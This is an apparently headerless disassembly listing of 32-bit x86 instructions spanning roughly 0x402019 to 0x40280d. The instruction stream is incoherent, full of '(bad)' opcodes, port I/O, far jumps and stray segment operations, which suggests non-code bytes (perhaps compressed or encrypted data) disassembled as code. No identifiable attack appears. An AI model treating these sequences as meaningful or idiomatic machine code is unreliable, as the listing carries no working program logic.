  402019:	mov    DWORD PTR [edx+0x10874ba5],esp
  40201f:	sbb    BYTE PTR [ebx-0x78],ch
  402022:	sub    al,0x65
  402024:	fidiv  DWORD PTR [esi]
  402026:	scas   eax,DWORD PTR es:[edi]
  402027:	cmp    al,0xd1
  402029:	popa   
  40202a:	clc    
  40202b:	sub    edx,esp
  40202d:	ror    bh,1
  40202f:	bound  ecx,QWORD PTR [ecx+0x1e]
  402032:	add    al,0xea
  402034:	mov    bh,0x64
  402036:	dec    edx
  402037:	pop    ss
  402038:	mov    eax,0x97d696cb
  40203d:	mov    eax,cs
  40203f:	push   cs
  402040:	mov    al,ds:0x1c447ae9
  402045:	push   edx
  402046:	inc    edi
  402047:	(bad)  
  402048:	xor    al,al
  40204a:	and    eax,0x275f7fa4
  40204f:	sbb    DWORD PTR [eax+0x53],esi
  402052:	jg     0x40209a
  402054:	xchg   ebp,eax
  402055:	mov    al,0x7a
  402057:	jnp    0x4020d1
  402059:	push   ss
  40205a:	dec    edi
  40205b:	dec    ebx
  40205c:	sub    eax,0x70aa7f0b
  402061:	pop    edx
  402062:	hlt    
  402063:	enter  0xb293,0x7
  402067:	inc    ecx
  402068:	mov    dh,0x23
  40206a:	in     eax,dx
  40206b:	mov    ds:0x8b093197,al
  402070:	pop    eax
  402071:	fild   QWORD PTR [ecx+edi*1]
  402074:	add    eax,0x3a1e1932
  402079:	outs   dx,BYTE PTR ds:[esi]
  40207a:	in     eax,0xfb
  40207c:	outs   dx,BYTE PTR ds:[esi]
  40207d:	cmp    BYTE PTR [esi+0x70f65681],bh
  402083:	push   cs
  402084:	mov    esp,0x34aff103
  402089:	ss stos BYTE PTR es:[edi],al
  40208b:	in     al,0x87
  40208d:	test   BYTE PTR [esi+esi*4-0x315d3aea],cl
  402094:	adc    eax,0x546f5b1b
  402099:	pop    eax
  40209a:	and    esi,ebx
  40209c:	pop    esp
  40209d:	inc    eax
  40209e:	dec    eax
  40209f:	pop    esp
  4020a0:	lea    edi,[edi+eax*1+0x27]
  4020a4:	dec    esi
  4020a5:	lea    ebp,[eax]
  4020a7:	pop    esp
  4020a8:	inc    ebp
  4020a9:	adc    ecx,0x4a8f4cc9
  4020af:	xor    al,0x46
  4020b1:	fs scas al,BYTE PTR es:[edi]
  4020b3:	jb     0x40205b
  4020b5:	int3   
  4020b6:	ret    
  4020b7:	test   eax,0x3dbe6d21
  4020bc:	mov    esp,0x949f2301
  4020c1:	fild   DWORD PTR [ebx-0x16]
  4020c4:	sti    
  4020c5:	sbb    eax,0x8858f6b1
  4020ca:	push   ss
  4020cb:	add    al,0xd7
  4020cd:	or     al,0x7c
  4020cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d0:	test   BYTE PTR [esi-0x8],ch
  4020d3:	loope  0x4020dd
  4020d5:	and    DWORD PTR [ecx],ebx
  4020d7:	mov    dl,0x6b
  4020d9:	popf   
  4020da:	add    al,0x6b
  4020dc:	scas   al,BYTE PTR es:[edi]
  4020dd:	adc    bh,al
  4020df:	push   0x50
  4020e1:	jno    0x4020cf
  4020e3:	mov    ebx,0x2cfe3c9b
  4020e8:	dec    edi
  4020e9:	sbb    eax,0x96f4b8de
  4020ee:	dec    eax
  4020ef:	mov    bh,0x7c
  4020f1:	xchg   DWORD PTR [ebp+edx*1+0x23f09ea4],esi
  4020f8:	loopne 0x402097
  4020fa:	test   BYTE PTR [eax+0x731bad97],0xb7
  402101:	cmp    eax,0x6a393b2d
  402106:	pop    DWORD PTR [edx+0x49]
  402109:	xchg   esi,eax
  40210a:	sub    al,0x6c
  40210c:	mov    esi,0x22c1b2f2
  402111:	ret    0x1520
  402114:	add    al,0xc6
  402116:	fldenv [edx+0x38]
  402119:	call   0xfa0a7dbd
  40211e:	ins    DWORD PTR es:[edi],dx
  40211f:	xchg   edi,eax
  402120:	lea    edi,[esi-0x2a]
  402123:	sbb    DWORD PTR [edi],eax
  402125:	xor    ebx,DWORD PTR [edi+ecx*2-0x6b]
  402129:	fs inc edi
  40212b:	xchg   edx,eax
  40212c:	sbb    BYTE PTR [ecx-0x3c07e891],bl
  402132:	sbb    eax,0xe1d2a2cb
  402137:	mov    bh,dl
  402139:	aas    
  40213a:	je     0x4020e6
  40213c:	notrack call DWORD PTR [edi]
  40213f:	jmp    0x74b262c7
  402144:	loop   0x4020ca
  402146:	mov    edx,0x8122dbd9
  40214b:	out    dx,al
  40214c:	mov    bl,al
  40214e:	or     ebx,DWORD PTR [ebp+0x61]
  402151:	call   0x94889b0f
  402156:	push   ds
  402157:	imul   ebx,eax,0xa78b9f87
  40215d:	es jmp 0x5caf:0xa6a24b1c
  402165:	jmp    0x851c6a1d
  40216a:	imul   ebp,ebx,0x8d2455cd
  402170:	dec    esi
  402171:	sub    al,0x4c
  402173:	jecxz  0x4020fc
  402175:	cmp    al,0x71
  402177:	(bad)  
  402179:	shl    DWORD PTR [eax-0x7edfcdf3],1
  40217f:	imul   esp,DWORD PTR [ebp+0x28f88fd0],0xffffffd3
  402186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402187:	xchg   ebp,eax
  402188:	cmp    BYTE PTR [edx+0x33],bh
  40218b:	or     DWORD PTR [ecx+0x15],edx
  40218e:	into   
  40218f:	into   
  402190:	mov    edi,0xbcf8b5be
  402195:	add    ebx,DWORD PTR [esi-0x2dee9f8e]
  40219b:	pop    DWORD PTR [ecx+0x78a2a43e]
  4021a1:	mov    cl,0xef
  4021a3:	mov    ds:0x44e4b52,eax
  4021a8:	es out 0x49,eax
  4021ab:	and    DWORD PTR ds:0xe21ac88f,edi
  4021b1:	ja     0x40222e
  4021b3:	xchg   DWORD PTR [edx-0x29120a5f],ecx
  4021b9:	or     cl,cl
  4021bb:	push   ebp
  4021bc:	pop    ss
  4021bd:	pop    esi
  4021be:	loop   0x402211
  4021c0:	cmp    bl,BYTE PTR [ebp+0x2573b0b]
  4021c6:	mov    ch,0x7a
  4021c8:	mov    dh,0xae
  4021ca:	in     eax,dx
  4021cb:	jno    0x40217d
  4021cd:	dec    esp
  4021ce:	pop    ebp
  4021cf:	outs   dx,DWORD PTR ds:[esi]
  4021d0:	aam    0x55
  4021d2:	sub    BYTE PTR [ebp-0x6de9fc5f],bh
  4021d8:	jp     0x402166
  4021da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021db:	push   ebp
  4021dc:	push   edi
  4021dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021de:	outs   dx,DWORD PTR ds:[esi]
  4021df:	or     bh,BYTE PTR [eax+0x52675323]
  4021e5:	sub    DWORD PTR [ebx-0x743291cc],ecx
  4021eb:	and    eax,0xf9208e67
  4021f0:	mov    ds:0xeb6a85c6,eax
  4021f5:	das    
  4021f6:	call   0x54f5:0xfa9b736a
  4021fd:	xchg   edx,eax
  4021fe:	xor    eax,DWORD PTR [ebx]
  402200:	mov    eax,ds:0xb4762273
  402205:	ins    BYTE PTR es:[edi],dx
  402206:	(bad)  
  402207:	push   cx
  402209:	mov    al,ds:0x69455aea
  40220e:	pusha  
  40220f:	mov    esp,0xa99c56c8
  402214:	test   al,0xd3
  402216:	pop    ebp
  402217:	dec    edx
  402218:	sub    al,0xa
  40221a:	pop    edx
  40221b:	addr16 pop esi
  40221d:	mov    ch,0xf1
  40221f:	aam    0x58
  402221:	add    eax,0xb7a1bab2
  402226:	xchg   BYTE PTR [esi-0x49128707],dh
  40222c:	mov    al,ds:0xe083f76
  402231:	pop    ss
  402232:	jmp    0x5b48:0xb07b2d77
  402239:	adc    eax,0xedf5ef54
  40223e:	xchg   edi,eax
  40223f:	ds dec edi
  402241:	cmp    eax,0xff3c1459
  402246:	push   ss
  402247:	ret    
  402248:	or     al,0x0
  40224a:	push   es
  40224b:	es pop esi
  40224d:	lods   al,BYTE PTR ds:[esi]
  40224e:	out    dx,al
  40224f:	push   es
  402250:	ss sub esp,esi
  402253:	xchg   ebx,eax
  402254:	sbb    BYTE PTR [esp+edi*1-0x65],cl
  402258:	mov    ebx,0x3c3b96d4
  40225d:	pop    edx
  40225e:	cs inc ebx
  402260:	add    BYTE PTR [edi],cl
  402262:	xlat   BYTE PTR ds:[ebx]
  402263:	popf   
  402264:	jmp    DWORD PTR [ebx-0x6931cd4f]
  40226a:	adc    al,bl
  40226c:	pop    ecx
  40226d:	mov    eax,ds:0x3757329c
  402272:	shr    ebx,cl
  402274:	push   esp
  402275:	and    ah,cl
  402277:	inc    ebx
  402278:	inc    ebp
  402279:	or     cl,bl
  40227b:	or     edx,0xffffff8e
  40227e:	or     BYTE PTR [esi],dl
  402280:	dec    eax
  402281:	es loop 0x40227f
  402284:	jb     0x402217
  402286:	cmp    edi,esi
  402288:	lea    edx,[edi+0x3ba52614]
  40228e:	jmp    0x628f:0x2ae9e608
  402295:	int3   
  402296:	jg     0x40230c
  402298:	stos   BYTE PTR es:[edi],al
  402299:	mov    ebp,0x88d531df
  40229e:	fwait
  40229f:	add    al,0x46
  4022a1:	dec    edi
  4022a2:	(bad)  
  4022a3:	cmp    bl,BYTE PTR ds:0x8491a339
  4022a9:	sbb    DWORD PTR [ebx+edi*2-0x3c],ebx
  4022ad:	and    eax,0x3e28928a
  4022b2:	cmp    cl,al
  4022b4:	pop    es
  4022b5:	stc    
  4022b6:	mov    eax,ds:0x68374fc5
  4022bb:	cmp    bl,BYTE PTR [ebx]
  4022bd:	xchg   edi,eax
  4022be:	les    esi,FWORD PTR cs:[ebx]
  4022c1:	test   edi,0xb43ec4ae
  4022c7:	pushf  
  4022c8:	daa    
  4022c9:	jne    0x402250
  4022cb:	fcmovbe st,st(5)
  4022cd:	std    
  4022ce:	daa    
  4022cf:	mov    dl,0xa3
  4022d1:	or     BYTE PTR [ecx],dh
  4022d3:	stos   DWORD PTR es:[edi],eax
  4022d4:	add    dh,dl
  4022d6:	fstp   DWORD PTR [eax-0x4b]
  4022d9:	ret    
  4022da:	cli    
  4022db:	xor    al,0x85
  4022dd:	xor    ebx,DWORD PTR [ecx+0x6e]
  4022e0:	or     ah,BYTE PTR [edx-0x3f46a500]
  4022e6:	and    eax,esi
  4022e8:	es scas al,BYTE PTR es:[edi]
  4022ea:	in     eax,dx
  4022eb:	scas   eax,DWORD PTR es:[edi]
  4022ec:	push   esp
  4022ed:	add    eax,0x887ffa30
  4022f2:	xor    ecx,ebp
  4022f4:	adc    DWORD PTR [edx+0x47],ecx
  4022f7:	out    dx,eax
  4022f8:	xlat   BYTE PTR ds:[ebx]
  4022f9:	xor    ah,BYTE PTR [edx+eiz*2+0x3]
  4022fd:	test   eax,0x3fdbe16b
  402302:	push   edi
  402303:	(bad)  
  402304:	jle    0x4022c3
  402306:	add    eax,0x540c4262
  40230b:	pop    ebp
  40230c:	cld    
  40230d:	loope  0x402299
  40230f:	cdq    
  402310:	mov    eax,ds:0xe735d4fe
  402315:	xchg   ebp,eax
  402316:	ret    
  402317:	mov    dh,0x35
  402319:	add    al,0x20
  40231b:	inc    ecx
  40231c:	retf   0xf40d
  40231f:	and    DWORD PTR [ecx-0x32002563],ecx
  402325:	xor    al,0x85
  402327:	retf   0x1383
  40232a:	cwde   
  40232b:	mov    eax,ds:0x2f7cee7b
  402330:	mov    al,0xb3
  402332:	cmp    dl,BYTE PTR [ebx]
  402334:	ds and eax,0x407015eb
  40233a:	fst    DWORD PTR [ecx]
  40233c:	lods   eax,DWORD PTR ds:[esi]
  40233d:	add    al,0x1
  40233f:	sbb    eax,0xe2109555
  402344:	in     al,dx
  402345:	xchg   BYTE PTR [eax],dh
  402347:	add    al,0x25
  402349:	sub    esp,ecx
  40234b:	sbb    DWORD PTR [ecx+0x2bee04de],esi
  402351:	push   ebx
  402352:	aad    0xfe
  402354:	sub    bl,dl
  402356:	pop    ebx
  402357:	sbb    bh,0xda
  40235a:	pop    esi
  40235b:	fisttp DWORD PTR [esi]
  40235d:	cmp    eax,0x861fe41c
  402362:	aas    
  402363:	xchg   ebx,eax
  402364:	je     0x402371
  402366:	ss inc edx
  402368:	aas    
  402369:	jg     0x402398
  40236b:	sbb    ah,BYTE PTR [edi-0x3c3f9143]
  402371:	xlat   BYTE PTR ds:[ebx]
  402372:	enter  0xb736,0xba
  402376:	scas   eax,DWORD PTR es:[edi]
  402377:	inc    edi
  402378:	jle    0x40232b
  40237a:	xor    ecx,DWORD PTR [ecx]
  40237c:	popa   
  40237d:	nop
  40237e:	adc    ebx,esp
  402380:	dec    edi
  402381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402382:	dec    edx
  402383:	jge    0x40235d
  402385:	pop    ebx
  402386:	pop    ss
  402387:	adc    eax,0x6d35ba1a
  40238c:	(bad)  
  40238d:	adc    DWORD PTR [ebx-0x41],ebp
  402390:	lahf   
  402391:	in     eax,0xf9
  402393:	xlat   BYTE PTR ds:[ebx]
  402394:	add    ch,dh
  402396:	mov    dh,0x9a
  402398:	mov    ah,0xe4
  40239a:	ins    DWORD PTR es:[edi],dx
  40239b:	arpl   WORD PTR [ebx+0x9ba3ec6],dx
  4023a1:	stc    
  4023a2:	inc    ebx
  4023a3:	out    dx,al
  4023a4:	push   esp
  4023a5:	loop   0x402423
  4023a7:	test   cl,cl
  4023a9:	aas    
  4023aa:	xchg   ebx,eax
  4023ab:	mov    al,0x62
  4023ad:	call   0xd72e:0x8e1e0bbf
  4023b4:	stos   DWORD PTR es:[edi],eax
  4023b5:	dec    ebx
  4023b6:	xchg   ebp,eax
  4023b7:	jle    0x402350
  4023b9:	mov    esp,edx
  4023bb:	dec    ecx
  4023bc:	int3   
  4023bd:	push   esp
  4023be:	add    ch,0xe5
  4023c1:	add    esi,DWORD PTR [edx-0x20]
  4023c4:	and    al,0xe4
  4023c6:	mov    BYTE PTR [edi],bl
  4023c8:	or     dl,BYTE PTR [edi-0x1d65ed13]
  4023ce:	clc    
  4023cf:	sub    ebx,0x31
  4023d2:	inc    dh
  4023d4:	and    dh,BYTE PTR [ebp+0x1a]
  4023d7:	repnz sub dh,dl
  4023da:	cwde   
  4023db:	pop    ecx
  4023dc:	mov    dl,bh
  4023de:	test   DWORD PTR [eax],ebx
  4023e0:	scas   eax,DWORD PTR es:[edi]
  4023e1:	jg     0x4023b2
  4023e3:	add    eax,0xe548a1a3
  4023e8:	pop    es
  4023e9:	outs   dx,BYTE PTR ds:[esi]
  4023ea:	xchg   ebp,eax
  4023eb:	xchg   esi,eax
  4023ec:	sar    DWORD PTR [ebp-0x46c820fd],1
  4023f2:	inc    ebp
  4023f3:	cwde   
  4023f4:	sbb    cl,BYTE PTR [ecx+eiz*4+0x16e1a336]
  4023fb:	jecxz  0x402474
  4023fd:	dec    esp
  4023fe:	or     eax,0x6a2626b
  402403:	cld    
  402404:	rol    DWORD PTR [ebx-0x25],cl
  402407:	mov    ah,0xb
  402409:	stos   DWORD PTR es:[edi],eax
  40240a:	cmp    al,0xe0
  40240c:	pop    ecx
  40240d:	es dec ebp
  40240f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402410:	stos   BYTE PTR es:[edi],al
  402411:	test   DWORD PTR [edx-0x64d8a549],eax
  402417:	rol    DWORD PTR [esi+0x461b34e9],0xfb
  40241e:	stos   DWORD PTR es:[edi],eax
  40241f:	ja     0x402414
  402421:	sub    esp,DWORD PTR [eax+0x50a7cc8]
  402427:	bound  ebp,QWORD PTR [edi-0x67c8dc32]
  40242d:	inc    esi
  40242e:	xor    dl,BYTE PTR [ebx+0x1562587e]
  402434:	xchg   esp,eax
  402435:	push   ss
  402436:	jmp    0x511e7ba6
  40243b:	jecxz  0x402448
  40243d:	xchg   ebx,eax
  40243e:	sahf   
  40243f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402440:	mov    ebp,0xeced3867
  402445:	shr    bl,cl
  402447:	hlt    
  402448:	sbb    esi,DWORD PTR [esi+0x16c60d0e]
  40244e:	sbb    DWORD PTR [ebp-0x1b],edi
  402451:	popa   
  402452:	fsub   DWORD PTR [eax+0x71]
  402455:	cdq    
  402456:	mov    eax,ds:0x772cd260
  40245b:	sbb    al,0x16
  40245d:	(bad)  
  40245f:	imul   ebx,edi,0xfffffffe
  402462:	jo     0x4023fd
  402464:	jmp    0x402490
  402466:	and    DWORD PTR [eax+0x41],0x16ca553a
  40246d:	sbb    al,0xd2
  40246f:	gs xor al,0x54
  402472:	lea    ebp,[edx+0x630cbfad]
  402478:	inc    esi
  402479:	sub    DWORD PTR [esp+esi*1+0x53842f36],edx
  402480:	sbb    dh,ch
  402482:	mov    edx,DWORD PTR [ecx-0x27]
  402485:	out    0x57,al
  402487:	add    DWORD PTR [ecx],esi
  402489:	(bad)  
  40248b:	add    esp,0xf8c555c6
  402491:	and    al,cl
  402493:	repnz add BYTE PTR [edx-0x3a50e43a],cl
  40249a:	push   0x14
  40249c:	aam    0x54
  40249e:	fcom   st(6)
  4024a0:	mov    cs,WORD PTR [ebx]
  4024a2:	and    al,0x5f
  4024a4:	retf   
  4024a5:	dec    esi
  4024a6:	inc    edi
  4024a7:	bound  edx,QWORD PTR ds:0x3237d796
  4024ad:	addr16 out 0xcf,eax
  4024b0:	into   
  4024b1:	and    eax,DWORD PTR [edx+0x6a]
  4024b4:	int    0x14
  4024b6:	or     BYTE PTR [edx],0x10
  4024b9:	repz cmp BYTE PTR [esi-0x27631530],dh
  4024c0:	mov    al,0x30
  4024c2:	call   0xf5ca:0x2b3b56d6
  4024c9:	add    eax,0xee8efdb2
  4024ce:	test   BYTE PTR [edx-0x8],dl
  4024d1:	les    ecx,FWORD PTR [eax+0x7a]
  4024d4:	test   DWORD PTR [ebp-0x1d],esi
  4024d7:	rol    BYTE PTR [esi-0x67de78c8],cl
  4024dd:	fucomip st,st(4)
  4024df:	mov    BYTE PTR [esi+eiz*2],dh
  4024e2:	aaa    
  4024e3:	or     ch,BYTE PTR [ebx]
  4024e5:	jp     0x4024de
  4024e7:	pop    esp
  4024e8:	jne    0x402557
  4024ea:	mov    cl,0x5b
  4024ec:	aaa    
  4024ed:	mov    DWORD PTR [edi],0x66e930f7
  4024f3:	idiv   DWORD PTR [esi-0x11862f4a]
  4024f9:	cs pop ebx
  4024fb:	add    BYTE PTR ds:0x580f8d88,dl
  402501:	cmovae ebp,esi
  402504:	push   0xffffff82
  402506:	xchg   ebx,eax
  402507:	or     ebp,ebp
  402509:	mov    ds:0x94233dc5,al
  40250e:	add    DWORD PTR [esi-0x64ef0d1],eax
  402514:	imul   edx,DWORD PTR [edi+0x3c889e6a],0x6cb51efd
  40251e:	mov    DWORD PTR [eax+0x21328d86],ebp
  402524:	clc    
  402525:	jmp    0x65aee8b3
  40252a:	sti    
  40252b:	iret   
  40252c:	call   0x3b85:0x4bb76282
  402533:	mov    cl,0xed
  402535:	sub    al,0x2f
  402537:	jmp    0x77a8:0x2261d20d
  40253e:	sbb    DWORD PTR [eax-0x3b],0x31bd32cc
  402545:	pop    esp
  402546:	shl    BYTE PTR [edx+0x55],cl
  402549:	fcom   DWORD PTR [ebx+0x7bf54ed9]
  40254f:	ret    0x1cd0
  402552:	je     0x40259a
  402554:	jmp    0x32c:0xbba8b82c
  40255b:	add    bl,BYTE PTR [ecx-0x17]
  40255e:	not    DWORD PTR cs:[ebx+0x3f]
  402562:	mov    edi,0x855b41d1
  402567:	adc    al,0x49
  40256a:	sub    eax,0x7f4be4f8
  40256f:	cmp    DWORD PTR [eax],eax
  402571:	jno    0x40256f
  402573:	gs ins DWORD PTR es:[edi],dx
  402575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402576:	pop    esp
  402577:	sub    esp,DWORD PTR [edi+edi*2-0x3384aaeb]
  40257e:	sub    esi,ebx
  402580:	std    
  402581:	icebp  
  402582:	stos   DWORD PTR es:[edi],eax
  402583:	test   BYTE PTR [ebx],bh
  402585:	out    dx,eax
  402586:	xor    eax,0xd6a71441
  40258b:	aaa    
  40258c:	rol    DWORD PTR [esi+0x53],cl
  40258f:	shr    BYTE PTR [eax+0x70d0fb7],1
  402595:	ficomp WORD PTR cs:[ebx+ebx*2]
  402599:	dec    edi
  40259a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40259b:	inc    edx
  40259c:	cmp    DWORD PTR [ebx],esp
  40259e:	add    eax,0x6d0f22f8
  4025a3:	cmp    eax,0x92e72e78
  4025a8:	(bad)  
  4025a9:	or     ch,BYTE PTR [edi+esi*8-0x3bcf2ddb]
  4025b0:	jne    0x402533
  4025b2:	fadd   QWORD PTR [esp+ecx*1+0x25c421a4]
  4025b9:	out    0xe5,eax
  4025bb:	cmp    al,0xfe
  4025bd:	jnp    0x402562
  4025bf:	sbb    edi,DWORD PTR [ebx-0x31]
  4025c2:	into   
  4025c3:	push   eax
  4025c4:	jecxz  0x4025ac
  4025c6:	std    
  4025c7:	loope  0x402615
  4025c9:	adc    al,0xd
  4025cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025cc:	cmp    eax,0x453db0e
  4025d1:	or     al,0xc4
  4025d3:	mov    dl,0xdb
  4025d5:	lds    esi,FWORD PTR [ecx+ecx*4+0x4810e71d]
  4025dc:	es (bad) 
  4025de:	(bad)  
  4025df:	cmp    esp,DWORD PTR [ebp+0x5a]
  4025e2:	das    
  4025e3:	(bad)  
  4025e4:	jmp    0x402620
  4025e6:	sub    al,0xd
  4025e8:	clc    
  4025e9:	and    BYTE PTR [esi+0x166a4ca8],0x19
  4025f0:	aad    0x23
  4025f2:	push   ebp
  4025f3:	sar    BYTE PTR ds:0xfe101478,0x67
  4025fa:	cmp    esp,edx
  4025fc:	cld    
  4025fd:	out    0x78,eax
  4025ff:	push   cs
  402600:	jl     0x40264d
  402602:	mov    ah,0xa0
  402604:	fnstenv [ebx+ebp*8]
  402607:	mov    bh,0xcd
  402609:	or     esi,edx
  40260b:	mov    esp,0xdfd1266
  402610:	fs or  al,0x7c
  402613:	pusha  
  402614:	fwait
  402615:	xchg   edx,eax
  402616:	hlt    
  402617:	mov    ch,0xa7
  402619:	sub    ebx,DWORD PTR gs:[edi]
  40261c:	aad    0x48
  40261e:	repnz push eax
  402620:	je     0x4025c9
  402622:	adc    al,0x3d
  402624:	push   0xffffffd2
  402626:	mov    ch,0x2c
  402628:	pop    es
  402629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40262a:	jp     0x4026a5
  40262c:	scas   eax,DWORD PTR es:[edi]
  40262d:	xor    al,0x38
  40262f:	push   ecx
  402630:	mov    cl,0x55
  402632:	jmp    0x976c46b1
  402637:	or     DWORD PTR [edi],esp
  402639:	sbb    ecx,DWORD PTR [edx-0x1a]
  40263c:	jo     0x4026ab
  40263e:	(bad)  
  40263f:	call   0xd234e1a
  402644:	pop    esp
  402645:	jl     0x402678
  402647:	mov    ds:0xfb99adbb,al
  40264c:	and    eax,0x5cc91f23
  402651:	(bad)  
  402652:	mov    DWORD PTR [eax+0x4e],esi
  402655:	mov    esi,0x8d0306c9
  40265a:	jbe    0x402651
  40265c:	div    edx
  40265e:	adc    DWORD PTR [esi+ebx*4-0x628e405c],edx
  402665:	(bad)  
  402666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402667:	cmc    
  402668:	loop   0x4026c3
  40266a:	rol    BYTE PTR [ebx-0x78],1
  40266d:	std    
  40266e:	xlat   BYTE PTR ds:[ebx]
  40266f:	fwait
  402670:	xchg   edi,eax
  402671:	loop   0x40269b
  402673:	add    al,0xf9
  402675:	mov    ds:0x6e008e22,al
  40267a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40267b:	sbb    BYTE PTR [eax],al
  40267d:	and    al,0x2f
  40267f:	ror    BYTE PTR [ecx-0x7e4d1589],0x5f
  402686:	dec    edi
  402687:	daa    
  402688:	fidivr DWORD PTR [edx-0x30]
  40268b:	aaa    
  40268c:	cs (bad) 
  40268f:	aaa    
  402690:	sbb    eax,0xdb240764
  402695:	jae    0x402692
  402697:	mov    al,ds:0x158eb5e3
  40269c:	outs   dx,DWORD PTR ds:[esi]
  40269d:	test   BYTE PTR [edi-0xa],bh
  4026a0:	icebp  
  4026a1:	scas   al,BYTE PTR es:[edi]
  4026a2:	or     ebx,DWORD PTR [eax-0x1e9fe3c9]
  4026a8:	fwait
  4026a9:	dec    esi
  4026aa:	jnp    0x4026d5
  4026ac:	outs   dx,DWORD PTR ds:[esi]
  4026ad:	lock mov esi,0xe09a48ad
  4026b3:	es pop ds
  4026b5:	xchg   edx,eax
  4026b6:	cmp    edx,edi
  4026b8:	dec    edx
  4026b9:	adc    al,0x6f
  4026bb:	mov    ecx,0x429182e5
  4026c0:	mov    bh,ah
  4026c2:	inc    esi
  4026c3:	add    al,0xac
  4026c5:	rcl    edx,0x16
  4026c8:	push   0x4c
  4026ca:	leave  
  4026cb:	js     0x402735
  4026cd:	repnz mov ds:0xa3f1a667,al
  4026d3:	out    dx,eax
  4026d4:	rcr    BYTE PTR ds:0xe5516734,1
  4026da:	cmc    
  4026db:	adc    al,0x58
  4026dd:	sub    BYTE PTR [edi+ecx*4-0x3b],bh
  4026e1:	adc    BYTE PTR ss:[ebx],bl
  4026e4:	xlat   BYTE PTR ds:[ebx]
  4026e5:	loope  0x402671
  4026e7:	imul   BYTE PTR [eax]
  4026e9:	ror    bl,cl
  4026eb:	movq   mm6,mm2
  4026ee:	cld    
  4026ef:	cmp    al,0x42
  4026f1:	popf   
  4026f2:	add    al,0x60
  4026f4:	call   0x72448658
  4026f9:	xchg   esp,eax
  4026fa:	out    dx,eax
  4026fb:	sti    
  4026fc:	arpl   WORD PTR [edi+0x36586e83],cx
  402702:	mov    eax,DWORD PTR [eax+0x6]
  402705:	cmp    eax,0x6d666fe3
  40270a:	jecxz  0x40277d
  40270c:	pop    ss
  40270d:	inc    ebx
  40270e:	lahf   
  40270f:	add    BYTE PTR [edx],ch
  402711:	xchg   ebx,ebp
  402713:	adc    BYTE PTR [eax],ch
  402715:	les    ebx,FWORD PTR [ebx-0x64719435]
  40271b:	mov    ebp,0x36ad1c68
  402720:	fwait
  402721:	push   ds
  402722:	test   DWORD PTR [edi],esp
  402724:	add    al,cl
  402726:	mov    WORD PTR [edi+0x47144c54],?
  40272c:	mov    edx,0x5049a1f8
  402731:	in     eax,0xb1
  402733:	leave  
  402734:	scas   al,BYTE PTR es:[edi]
  402735:	xchg   esi,eax
  402736:	inc    edi
  402737:	mov    eax,0x7122f352
  40273c:	out    0xa0,al
  40273e:	nop
  40273f:	jb     0x402768
  402741:	pusha  
  402742:	dec    edi
  402743:	xchg   esp,eax
  402744:	pop    esp
  402745:	adc    ecx,ebp
  402747:	cmp    al,bl
  402749:	pop    ebp
  40274a:	mul    BYTE PTR [esi+edi*2+0x7e2c55b6]
  402751:	aas    
  402752:	pop    esi
  402753:	push   esi
  402754:	cmp    dh,BYTE PTR [edi]
  402756:	dec    edi
  402757:	xchg   esi,eax
  402758:	lea    esp,[edx]
  40275a:	mov    edi,0x5b5c786
  40275f:	aam    0xd8
  402761:	inc    esp
  402762:	sahf   
  402763:	pop    ebx
  402764:	daa    
  402765:	fdiv   QWORD PTR [ecx]
  402767:	imul   edi,DWORD PTR [ebx-0x16],0x61
  40276b:	jne    0x402741
  40276d:	rol    BYTE PTR [ecx+0x14],cl
  402770:	cmp    dh,cl
  402772:	mov    al,0xf7
  402774:	mov    cl,0x56
  402776:	adc    dh,ch
  402778:	out    dx,eax
  402779:	adc    BYTE PTR [ebx],0xc3
  40277c:	mov    ds:0x6ecc78cf,al
  402781:	xchg   ecx,eax
  402782:	bound  ecx,QWORD PTR [edi]
  402784:	icebp  
  402785:	fidivr WORD PTR [edx-0x21e3a350]
  40278b:	and    bh,0x8f
  40278e:	or     edi,ecx
  402790:	loop   0x40278a
  402792:	fadd   QWORD PTR [eax]
  402794:	cdq    
  402795:	mov    esi,0x457324b1
  40279a:	loop   0x4027a8
  40279c:	and    ah,bl
  40279e:	bnd ja 0x40275d
  4027a1:	daa    
  4027a2:	pop    ebp
  4027a3:	pop    es
  4027a4:	xchg   bl,ah
  4027a6:	mov    gs,WORD PTR [esi-0x7e]
  4027a9:	and    dh,BYTE PTR [esi]
  4027ab:	mov    edi,0x97e2ed3f
  4027b0:	icebp  
  4027b1:	mov    ds:0x93ed8899,al
  4027b6:	dec    edi
  4027b7:	dec    eax
  4027b8:	pop    es
  4027b9:	mov    dh,0x1f
  4027bb:	mov    al,ds:0xcf44c3ed
  4027c0:	cmp    edi,DWORD PTR [eax-0x19]
  4027c3:	cdq    
  4027c4:	xchg   edi,eax
  4027c5:	push   cs
  4027c6:	xor    DWORD PTR [esi-0x2e],ecx
  4027c9:	pop    es
  4027ca:	mov    eax,0x8d1dd43
  4027cf:	mov    ebx,0x31d5bbdf
  4027d4:	cmp    al,BYTE PTR [edi]
  4027d6:	xchg   edi,eax
  4027d7:	ins    DWORD PTR es:[edi],dx
  4027d8:	cmp    BYTE PTR [ebp-0x3a],cl
  4027db:	sub    bl,cl
  4027dd:	push   esi
  4027de:	pop    edi
  4027df:	sub    al,0x7c
  4027e1:	popa   
  4027e2:	jp     0x402786
  4027e4:	push   0xc2028ed3
  4027e9:	data16 jbe 0x402850
  4027ec:	std    
  4027ed:	sub    eax,0xf0e3391e
  4027f2:	jo     0x402801
  4027f4:	addr16 (bad) 
  4027f6:	push   ds
  4027f7:	ret    0xfafb
  4027fa:	xchg   edi,eax
  4027fb:	cmp    al,0xe1
  4027fd:	push   0xffffff8f
  4027ff:	jo     0x4027e8
  402801:	adc    al,0x58
  402803:	rol    BYTE PTR [ecx-0x26],0x5d
  402807:	jnp    0x402872
  402809:	xor    al,0x45
  40280b:	sub    esi,esp
  40280d:	mov    edi,0x31641f10
